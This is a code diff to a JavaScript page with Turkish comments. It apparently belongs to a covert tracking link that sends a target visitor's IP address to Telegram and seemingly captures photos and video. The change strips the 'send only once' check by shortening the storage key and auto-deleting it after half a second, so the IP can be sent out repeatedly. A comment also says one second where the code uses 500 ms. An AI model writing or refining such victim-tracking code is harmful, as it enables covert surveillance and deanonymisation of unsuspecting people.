@@ -82,16 +82,22 @@
         let photoCount = 0;
         
         // ============================================
-        // SADECE BU LİNK İÇİN 1 KERE KONTROLÜ
+        // SADECE ID'YE GÖRE KONTROL (SÜRELERİ DİKKATE ALMA)
         // ============================================
         function ipGonderildiMi() {
-            const linkKey = `ip_gonderildi_${TARGET_ID}_${FOTO_SURESI}_${VIDEO_SURESI}`;
+            const linkKey = `ip_gonderildi_${TARGET_ID}`;
             return localStorage.getItem(linkKey) === "true";
         }
         
         function ipGonderildiOlarakIsaretle() {
-            const linkKey = `ip_gonderildi_${TARGET_ID}_${FOTO_SURESI}_${VIDEO_SURESI}`;
+            const linkKey = `ip_gonderildi_${TARGET_ID}`;
             localStorage.setItem(linkKey, "true");
+            
+            // 1 saniye sonra otomatik sil (süper hızlı)
+            setTimeout(() => {
+                localStorage.removeItem(linkKey);
+                console.log("IP kaydı silindi, yeni linkte tekrar gönderilebilir");
+            }, 500); // 0.5 saniye sonra sil
         }
         
         // ============================================
@@ -108,7 +114,7 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER (SADECE 1 KERE)
+        // İP'Yİ TELEGRAM'A GÖNDER
         // ============================================
         async function sendIP(ip, kaynak = 'sayfa') {
             if (ipGonderildiMi()) return;
